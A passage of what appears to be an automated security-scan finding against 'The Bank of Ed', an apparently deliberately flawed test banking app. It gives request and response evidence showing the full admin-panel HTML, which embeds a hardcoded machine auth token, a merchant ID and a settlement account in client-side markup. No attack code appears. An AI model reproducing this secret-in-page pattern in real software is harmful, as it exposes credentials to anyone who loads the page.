                <h2 class="text-xl font-bold text-dark-900">FACE Insurance Integration</h2>
                <p class="text-sm text-dark-500">Configure target URL for White-Label Insurance SSO</p>
              </div>
            </div>
            <form id="insurance-settings-form" onsubmit="BankOfEdAdmin.SystemPage.saveSettings(event)" class="space-y-4">
              <div>
                <label class="block text-sm font-medium text-dark-700 mb-1.5">FACE Insurance Base URL</label>
                <input type="url" id="setting-insurance-url" required class="w-full px-4 py-3 rounded-xl border border-dark-200 focus:ring-2 focus:ring-red-500 focus:border-red-500 outline-none transition text-sm" placeholder="http://localhost:8001">
                <p class="text-xs text-dark-400 mt-1.5">When customers click Insurance, they will be redirected to this URL with an SSO assertion token.</p>
              </div>
              <div class="p-3.5 bg-dark-50 rounded-xl text-xs text-dark-600 space-y-1 font-mono">
                <div><span class="font-semibold text-dark-800">Merchant ID:</span> <span id="setting-merchant-id">faceinsurance</span></div>
                <div><span class="font-semibold text-dark-800">Settlement Account:</span> <span id="setting-merchant-account">062-001 88880001 (face@example.com)</span></div>
                <div><span class="font-semibold text-dark-800">Machine Auth Token:</span> <span id="setting-machine-token" class="text-dark-500">mch_face_insurance_secret_key_2026</span></div>
              </div>
              <button type="submit" id="save-settings-btn" class="bg-dark-900 hover:bg-dark-800 text-white font-semibold px-6 py-2.5 rounded-xl transition-colors text-sm flex items-center justify-center gap-2 disabled:opacity-50">
                <span>Save Settings</span>
                <svg class="w-4 h-4 animate-spin hidden" viewBox="0 0 24 24"><circle class="opacity-25" cx="12" cy="12" r="10" stroke="currentColor" stroke-width="4" fill="none"></circle><path class="opacity-75" fill="currentColor" d="M4 12a8 8 0 018-8V0C5.373 0 0 5.373 0 12h4z"></path></svg>
              </button>
            </form>
          </div>

          <!-- Reset Database Card -->
          <div class="bg-white rounded-2xl shadow-sm border border-red-200 p-6 sm:p-8 max-w-xl">
            <div class="flex items-center gap-3 mb-4">
              <div class="w-12 h-12 bg-red-100 rounded-full flex items-center justify-center flex-shrink-0">
                <svg class="w-6 h-6 text-red-600" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M12 9v2m0 4h.01m-6.938 4h13.856c1.54 0 2.502-1.667 1.732-3L13.732 4c-.77-1.333-2.694-1.333-3.464 0L3.34 16c-.77 1.333.192 3 1.732 3z"></path></svg>
              </div>
              <div>
                <h2 class="text-xl font-bold text-dark-900">Reset Database</h2>
                <p class="text-sm text-dark-500">Drop and recreate the entire database with seed data</p>
              </div>
            </div>
            <div class="bg-red-50 border border-red-200 rounded-xl p-4 mb-6">
              <p class="text-red-800 text-sm font-medium">Warning: This action is irreversible</p>
              <p class="text-red-600 text-xs mt-1">All customer data, accounts, and transactions will be permanently deleted and replaced with default seed data.</p>
            </div>
            <p class="text-sm text-dark-600 mb-3">Type <strong>RESET</strong> below to confirm:</p>
            <input type="text" id="reset-confirm-input" class="w-full px-4 py-3 rounded-xl border border-dark-200 focus:ring-2 focus:ring-red-500 focus:border-red-500 outline-none transition font-mono tracking-widest text-center text-lg mb-4" placeholder="Type RESET">
            <button id="reset-btn" onclick="BankOfEdAdmin.SystemPage.handleReset()" class="w-full bg-red-600 hover:bg-red-700 text-white font-semibold py-3 rounded-xl transition-colors flex items-center justify-center gap-2 disabled:opacity-50 disabled:cursor-not-allowed">
              <span>Reset Database</span>
              <svg class="w-4 h-4 animate-spin hidden" viewBox="0 0 24 24"><circle class="opacity-25" cx="12" cy="12" r="10" stroke="currentColor" stroke-width="4" fill="none"></circle><path class="opacity-75" fill="currentColor" d="M4 12a8 8 0 018-8V0C5.373 0 0 5.373 0 12h4z"></path></svg>
            </button>
          </div>
        </section>

      </div>
    </main>
  </div>

  <!-- Scripts -->
  <script src="js/utils.js"></script>
  <script src="js/api.js"></script>
  <script src="js/router.js"></script>
  <script src="js/pages/auth.js"></script>
  <script src="js/pages/customers.js"></script>
  <script src="js/pages/accounts.js"></script>
  <script src="js/pages/system.js"></script>
  <script src="js/pages/fx-rates.js"></script>
  <script src="js/app.js"></script>
</body>
</html>
```

### Request Evidence
```
GET http://localhost:8081/admin/#/customers/11
use_session: anonymous  Authorization: present
Cookies: none
{}
```

### Response Evidence
```
Status: 200
date: Tue, 08 Sep 2026 13:34:23 GMT
server: Apache/2.4.68 (Unix)
last-modified: Sun, 23 Aug 2026 12:34:31 GMT
etag: "4c9c-659b6175aa3c0"
accept-ranges: bytes
content-length: 19612
keep-alive: timeout=5, max=100
connection: Keep-Alive
content-type: text/html

<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>The Bank of Ed - Admin</title>
  <link rel="preconnect" href="https://fonts.googleapis.com">
  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700&display=swap" rel="stylesheet">
  <script src="https://cdn.tailwindcss.com"></script>
  <script>
    tailwind.config = {
      theme: {
        extend: {
          colors: {
            dark: {
              50: '#f4f4f5', 100: '#e4e4e7', 200: '#d4d4d8', 300: '#a1a1aa',
              400: '#71717a', 500: '#52525b', 600: '#3f3f46', 700: '#27272a',
              800: '#18181b', 900: '#09090b', 950: '#030305'
            }
          },
          fontFamily: { sans: ['Inter', 'system-ui', 'sans-serif'] }
        }
      }
    }
  </script>
  <link rel="stylesheet" href="css/app.css">
</head>
<body class="bg-dark-50 font-sans text-dark-800">

  <!-- Toast Container -->
  <div id="toast-container" class="fixed top-4 right-4 z-50 space-y-2"></div>

  <!-- Modal Overlay -->
  <div id="modal-overlay" class="hidden fixed inset-0 z-40 bg-black/50 backdrop-blur-sm flex items-center justify-center p-4">
    <div id="modal-content" class="bg-white rounded-2xl shadow-2xl w-full max-w-md max-h-[90vh] overflow-y-auto"></div>
  </div>

  <!-- ===================== AUTH VIEW ===================== -->
  <div id="view-auth" class="hidden min-h-screen flex items-center justify-center bg-gradient-to-br from-dark-900 via-dark-800 to-dark-950 p-4">
    <div class="w-full max-w-md">
      <div class="text-center mb-8">
        <div class="inline-flex items-center gap-3">
          <div class="w-12 h-12 bg-red-600 rounded-xl flex items-center justify-center">
            <svg class="w-7 h-7 text-white" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M10.325 4.317c.426-1.756 2.924-1.756 3.35 0a1.724 1.724 0 002.573 1.066c1.543-.94 3.31.826 2.37 2.37a1.724 1.724 0 001.066 2.573c1.756.426 1.756 2.924 0 3.35a1.724 1.724 0 00-1.066 2.573c.94 1.543-.826 3.31-2.37 2.37a1.724 1.724 0 00-2.573 1.066c-.426 1.756-2.924 1.756-3.35 0a1.724 1.724 0 00-2.573-1.066c-1.543.94-3.31-.826-2.37-2.37a1.724 1.724 0 00-1.066-2.573c-1.756-.426-1.756-2.924 0-3.35a1.724 1.724 0 001.066-2.573c-.94-1.543.826-3.31 2.37-2.37.996.608 2.296.07 2.572-1.065z"></path><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M15 12a3 3 0 11-6 0 3 3 0 016 0z"></path></svg>
          </div>
          <h1 class="text-3xl font-bold text-white">The Bank of Ed</h1>
        </div>
        <p class="text-dark-400 mt-2">Administration Panel</p>
      </div>

      <div class="bg-white rounded-2xl shadow-2xl overflow-hidden p-8">
        <form id="login-form" onsubmit="BankOfEdAdmin.AuthPage.handleLogin(event)">
          <div class="space-y-5">
            <div>
              <label class="block text-sm font-medium text-dark-700 mb-1.5">Username</label>
              <input type="text" name="username" required class="w-full px-4 py-3 rounded-xl border border-dark-200 focus:ring-2 focus:ring-red-500 focus:border-red-500 outline-none transition" placeholder="admin" autofocus>
            </div>
            <div>
              <label class="block text-sm font-medium text-dark-700 mb-1.5">Password</label>
              <input type="password" name="password" required class="w-full px-4 py-3 rounded-xl border border-dark-200 focus:ring-2 focus:ring-red-500 focus:border-red-500 outline-none transition" placeholder="Enter password">
            </div>
          </div>
          <div id="login-errors" class="mt-4 text-sm text-red-600 hidden"></div>
          <button type="submit" class="w-full mt-6 bg-red-600 hover:bg-red-700 text-white font-semibold py-3 rounded-xl transition-colors flex items-center justify-center gap-2">
            <span>Sign In</span>
            <svg class="w-4 h-4 animate-spin hidden" viewBox="0 0 24 24"><circle class="opacity-25" cx="12" cy="12" r="10" stroke="currentColor" stroke-width="4" fill="none"></circle><path class="opacity-75" fill="currentColor" d="M4 12a8 8 0 018-8V0C5.373 0 0 5.373 0 12h4z"></path></svg>
          </button>
        </form>
      </div>
    </div>
  </div>

  <!-- ===================== APP SHELL ===================== -->
  <div id="app-shell" class="hidden flex h-screen overflow-hidden">

    <!-- Mobile Header -->
    <div class="lg:hidden fixed top-0 left-0 right-0 z-30 bg-dark-900 text-white flex items-center justify-between px-4 py-3">
      <button onclick="BankOfEdAdmin.App.toggleSidebar()" class="p-2 hover:bg-dark-800 rounded-lg">
        <svg class="w-6 h-6" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M4 6h16M4 12h16M4 18h16"></path></svg>
      </button>
      <div class="flex items-center gap-2">
        <div class="w-8 h-8 bg-red-600 rounded-lg flex items-center justify-center">
          <svg class="w-5 h-5 text-white" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M10.325 4.317c.426-1.756 2.924-1.756 3.35 0a1.724 1.724 0 002.573 1.066c1.543-.94 3.31.826 2.37 2.37a1.724 1.724 0 001.066 2.573c1.756.426 1.756 2.924 0 3.35a1.724 1.724 0 00-1.066 2.573c.94 1.543-.826 3.31-2.37 2.37a1.724 1.724 0 00-2.573 1.066c-.426 1.756-2.924 1.756-3.35 0a1.724 1.724 0 00-2.573-1.066c-1.543.94-3.31-.826-2.37-2.37a1.724 1.724 0 00-1.066-2.573c-1.756-.426-1.756-2.924 0-3.35a1.724 1.724 0 001.066-2.573c-.94-1.543.826-3.31 2.37-2.37.996.608 2.296.07 2.572-1.065z"></path><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M15 12a3 3 0 11-6 0 3 3 0 016 0z"></path></svg>
        </div>
        <span class="font-semibold">Admin</span>
      </div>
      <div class="w-10"></div>
    </div>

    <!-- Sidebar Overlay (mobile) -->
    <div id="sidebar-overlay" onclick="BankOfEdAdmin.App.toggleSidebar()" class="hidden fixed inset-0 z-30 bg-black/50 lg:hidden"></div>

    <!-- Sidebar -->
    <aside id="sidebar" class="fixed lg:static inset-y-0 left-0 z-40 w-64 bg-dark-900 text-white flex flex-col transform -translate-x-full lg:translate-x-0 transition-transform duration-200">
      <div class="p-6 flex items-center gap-3">
        <div class="w-10 h-10 bg-red-600 rounded-xl flex items-center justify-center flex-shrink-0">
          <svg class="w-6 h-6 text-white" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M10.325 4.317c.426-1.756 2.924-1.756 3.35 0a1.724 1.724 0 002.573 1.066c1.543-.94 3.31.826 2.37 2.37a1.724 1.724 0 001.066 2.573c1.756.426 1.756 2.924 0 3.35a1.724 1.724 0 00-1.066 2.573c.94 1.543-.826 3.31-2.37 2.37a1.724 1.724 0 00-2.573 1.066c-.426 1.756-2.924 1.756-3.35 0a1.724 1.724 0 00-2.573-1.066c-1.543.94-3.31-.826-2.37-2.37a1.724 1.724 0 00-1.066-2.573c-1.756-.426-1.756-2.924 0-3.35a1.724 1.724 0 001.066-2.573c-.94-1.543.826-3.31 2.37-2.37.996.608 2.296.07 2.572-1.065z"></path><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M15 12a3 3 0 11-6 0 3 3 0 016 0z"></path></svg>
        </div>
        <div>
          <h2 class="font-bold text-lg">The Bank of Ed</h2>
          <p class="text-xs text-dark-400">Admin Panel</p>
        </div>
      </div>

      <nav class="flex-1 px-3 space-y-1 mt-2">
        <a href="#/customers" data-nav="customers" class="nav-link flex items-center gap-3 px-4 py-3 rounded-xl text-dark-300 hover:text-white hover:bg-dark-800 transition-colors">
          <svg class="w-5 h-5" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M17 20h5v-2a3 3 0 00-5.356-1.857M17 20H7m10 0v-2c0-.656-.126-1.283-.356-1.857M7 20H2v-2a3 3 0 015.356-1.857M7 20v-2c0-.656.126-1.283.356-1.857m0 0a5.002 5.002 0 019.288 0M15 7a3 3 0 11-6 0 3 3 0 016 0z"></path></svg>
          <span>Customers</span>
        </a>
        <a href="#/accounts" data-nav="accounts" class="nav-link flex items-center gap-3 px-4 py-3 rounded-xl text-dark-300 hover:text-white hover:bg-dark-800 transition-colors">
          <svg class="w-5 h-5" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M3 10h18M7 15h1m4 0h1m-7 4h12a3 3 0 003-3V8a3 3 0 00-3-3H6a3 3 0 00-3 3v8a3 3 0 003 3z"></path></svg>
          <span>Accounts</span>
        </a>
        <a href="#/fx-rates" data-nav="fx-rates" class="nav-link flex items-center gap-3 px-4 py-3 rounded-xl text-dark-300 hover:text-white hover:bg-dark-800 transition-colors">
          <svg class="w-5 h-5" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M12 8c-1.657 0-3 .895-3 2s1.343 2 3 2 3 .895 3 2-1.343 2-3 2m0-8c1.11 0 2.08.402 2.599 1M12 8V7m0 1v8m0 0v1m0-1c-1.11 0-2.08-.402-2.599-1M21 12a9 9 0 11-18 0 9 9 0 0118 0z"></path></svg>
          <span>FX Rates</span>
        </a>
        <a href="#/system" data-nav="system" class="nav-link flex items-center gap-3 px-4 py-3 rounded-xl text-dark-300 hover:text-white hover:bg-dark-800 transition-colors">
          <svg class="w-5 h-5" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M4 4v5h.582m15.356 2A8.001 8.001 0 004.582 9m0 0H9m11 11v-5h-.581m0 0a8.003 8.003 0 01-15.357-2m15.357 2H15"></path></svg>
          <span>System</span>
        </a>
      </nav>

      <div class="p-4 border-t border-dark-800">
        <div class="flex items-center gap-3 mb-3 px-2">
          <div class="w-9 h-9 bg-dark-700 rounded-full flex items-center justify-center text-sm font-semibold" id="sidebar-avatar">A</div>
          <div class="min-w-0">
            <p class="text-sm font-medium truncate" id="sidebar-admin-name">Admin</p>
          </div>
        </div>
        <button onclick="BankOfEdAdmin.App.logout()" class="w-full flex items-center gap-3 px-4 py-2.5 rounded-xl text-dark-400 hover:text-red-400 hover:bg-dark-800 transition-colors text-sm">
          <svg class="w-5 h-5" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M17 16l4-4m0 0l-4-4m4 4H7m6 4v1a3 3 0 01-3 3H6a3 3 0 01-3-3V7a3 3 0 013-3h4a3 3 0 013 3v1"></path></svg>
          <span>Sign Out</span>
        </button>
      </div>
    </aside>

    <!-- Main Content -->
    <main class="flex-1 overflow-y-auto pt-14 lg:pt-0">
      <div class="p-4 sm:p-6 lg:p-8 max-w-7xl mx-auto">

        <!-- Customers List -->
        <section id="page-customers" class="hidden">
          <div class="flex items-center justify-between mb-6">
            <div>
              <h1 class="text-2xl font-bold text-dark-900">Customers</h1>
              <p class="text-dark-500 mt-1">Manage customer accounts</p>
            </div>
            <div class="flex items-center gap-3">
              <input type="text" id="customer-search" placeholder="Search..." class="px-4 py-2.5 rounded-xl border border-dark-200 focus:ring-2 focus:ring-red-500 focus:border-red-500 outline-none transition text-sm w-48" onkeyup="BankOfEdAdmin.CustomersPage.handleSearch(event)">
            </div>
          </div>
          <div id="customers-table" class="bg-white rounded-2xl shadow-sm border border-dark-100 overflow-hidden"></div>
          <div id="customers-pagination" class="mt-4 flex items-center justify-between"></div>
        </section>

        <!-- Customer Detail -->
        <section id="page-customer-detail" class="hidden">
          <a href="#/customers" class="inline-flex items-center gap-1 text-red-600 hover:text-red-700 text-sm font-medium mb-6">
            <svg class="w-4 h-4" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M15 19l-7-7 7-7"></path></svg>
            Back to Customers
          </a>
          <div id="customer-detail-content"></div>
        </section>

        <!-- Accounts -->
        <section id="page-accounts" class="hidden">
          <div class="mb-6">
            <h1 class="text-2xl font-bold text-dark-900">All Accounts</h1>
            <p class="text-dark-500 mt-1">View and manage all bank accounts</p>
          </div>
          <div id="accounts-table" class="bg-white rounded-2xl shadow-sm border border-dark-100 overflow-hidden"></div>
          <div id="accounts-pagination" class="mt-4 flex items-center justify-between"></div>
        </section>

        <!-- FX Rates -->
        <section id="page-fx-rates" class="hidden">
          <div class="flex items-center justify-between mb-6">
            <div>
              <h1 class="text-2xl font-bold text-dark-900">FX Rates</h1>
              <p class="text-dark-500 mt-1">Manage foreign exchange rates</p>
            </div>
            <button onclick="BankOfEdAdmin.FxRatesPage.showAddModal()" class="bg-red-600 hover:bg-red-700 text-white font-semibold px-5 py-2.5 rounded-xl transition-colors text-sm flex items-center gap-2">
              <svg class="w-4 h-4" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M12 4v16m8-8H4"></path></svg>
              Add Rate
            </button>
          </div>
          <div id="fx-rates-table" class="bg-white rounded-2xl shadow-sm border border-dark-100 overflow-hidden"></div>
        </section>

        <!-- System -->
        <section id="page-system" class="hidden">
          <div class="mb-6">
            <h1 class="text-2xl font-bold text-dark-900">System Management</h1>
            <p class="text-dark-500 mt-1">Integration settings, database operations and maintenance</p>
          </div>

          <!-- White-Label Partner Settings Card -->
          <div class="bg-white rounded-2xl shadow-sm border border-dark-100 p-6 sm:p-8 max-w-xl mb-6">
            <div class="flex items-center gap-3 mb-4">
              <div class="w-12 h-12 bg-amber-100 rounded-full flex items-center justify-center flex-shrink-0">
                <svg class="w-6 h-6 text-amber-600" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M13.828 10.172a4 4 0 00-5.656 0l-4 4a4 4 0 105.656 5.656l1.102-1.101m-.758-4.899a4 4 0 005.656 0l4-4a4 4 0 00-5.656-5.656l-1.1 1.1"></path></svg>
              </div>
              <div>
                <h2 class="text-xl font-bold text-dark-900">FACE Insurance Integration</h2>
                <p class="text-sm text-dark-500">Configure target URL for White-Label Insurance SSO</p>
              </div>
            </div>
            <form id="insurance-settings-form" onsubmit="BankOfEdAdmin.SystemPage.saveSettings(event)" class="space-y-4">
              <div>
                <label class="block text-sm font-medium text-dark-700 mb-1.5">FACE Insurance Base URL</label>
                <input type="url" id="setting-insurance-url" required class="w-full px-4 py-3 rounded-xl border border-dark-200 focus:ring-2 focus:ring-red-500 focus:border-red-500 outline-none transition text-sm" placeholder="http://localhost:8001">
                <p class="text-xs text-dark-400 mt-1.5">When customers click Insurance, they will be redirected to this URL with an SSO assertion token.</p>
              </div>
              <div class="p-3.5 bg-dark-50 rounded-xl text-xs text-dark-600 space-y-1 font-mono">
                <div><span class="font-semibold text-dark-800">Merchant ID:</span> <span id="setting-merchant-id">faceinsurance</span></div>
                <div><span class="font-semibold text-dark-800">Settlement Account:</span> <span id="setting-merchant-account">062-001 88880001 (face@example.com)</span></div>
                <div><span class="font-semibold text-dark-800">Machine Auth Token:</span> <span id="setting-machine-token" class="text-dark-500">mch_face_insurance_secret_key_2026</span></div>
              </div>
              <button type="submit" id="save-settings-btn" class="bg-dark-900 hover:bg-dark-800 text-white font-semibold px-6 py-2.5 rounded-xl transition-colors text-sm flex items-center justify-center gap-2 disabled:opacity-50">
                <span>Save Settings</span>
                <svg class="w-4 h-4 animate-spin hidden" viewBox="0 0 24 24"><circle class="opacity-25" cx="12" cy="12" r="10" stroke="currentColor" stroke-width="4" fill="none"></circle><path class="opacity-75" fill="currentColor" d="M4 12a8 8 0 018-8V0C5.373 0 0 5.373 0 12h4z"></path></svg>
              </button>
            </form>
          </div>

          <!-- Reset Database Card -->
          <div class="bg-white rounded-2xl shadow-sm border border-red-200 p-6 sm:p-8 max-w-xl">
            <div class="flex items-center gap-3 mb-4">
              <div class="w-12 h-12 bg-red-100 rounded-full flex items-center justify-center flex-shrink-0">
                <svg class="w-6 h-6 text-red-600" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M12 9v2m0 4h.01m-6.938 4h13.856c1.54 0 2.502-1.667 1.732-3L13.732 4c-.77-1.333-2.694-1.333-3.464 0L3.34 16c-.77 1.333.192 3 1.732 3z"></path></svg>
              </div>
              <div>
                <h2 class="text-xl font-bold text-dark-900">Reset Database</h2>
                <p class="text-sm text-dark-500">Drop and recreate the entire database with seed data</p>
              </div>
            </div>
            <div class="bg-red-50 border border-red-200 rounded-xl p-4 mb-6">
              <p class="text-red-800 text-sm font-medium">Warning: This action is irreversible</p>
              <p class="text-red-600 text-xs mt-1">All customer data, accounts, and transactions will be permanently deleted and replaced with default seed data.</p>
            </div>
            <p class="text-sm text-dark-600 mb-3">Type <strong>RESET</strong> below to confirm:</p>
            <input type="text" id="reset-confirm-input" class="w-full px-4 py-3 rounded-xl border border-dark-200 focus:ring-2 focus:ring-red-500 focus:border-red-500 outline-none transition font-mono tracking-widest text-center text-lg mb-4" placeholder="Type RESET">
            <button id="reset-btn" onclick="BankOfEdAdmin.SystemPage.handleReset()" class="w-full bg-red-600 hover:bg-red-700 text-white font-semibold py-3 rounded-xl transition-colors flex items-center justify-center gap-2 disabled:opacity-50 disabled:cursor-not-allowed">
              <span>Reset Database</span>
              <svg class="w-4 h-4 animate-spin hidden" viewBox="0 0 24 24"><circle class="opacity-25" cx="12" cy="12" r="10" stroke="currentColor" stroke-width="4" fill="none"></circle><path class="opacity-75" fill="currentColor" d="M4 12a8 8 0 018-8V0C5.373 0 0 5.373 0 12h4z"></path></svg>
            </button>
          </div>
        </section>

      </div>
    </main>
  </div>

  <!-- Scripts -->
  <script src="js/utils.js"></script>
  <script src="js/api.js"></script>
  <script src="js/router.js"></script>
  <script src="js/pages/auth.js"></script>
  <script src="js/pages/customers.js"></script>
  <script src="js/pages/accounts.js"></script>
  <script src="js/pages/system.js"></script>
  <script src="js/pages/fx-rates.js"></script>
  <script src="js/app.js"></script>
</body>
</html>
```

### Validation Note
Not validated: severity 'info' is below the configured threshold 'low'.
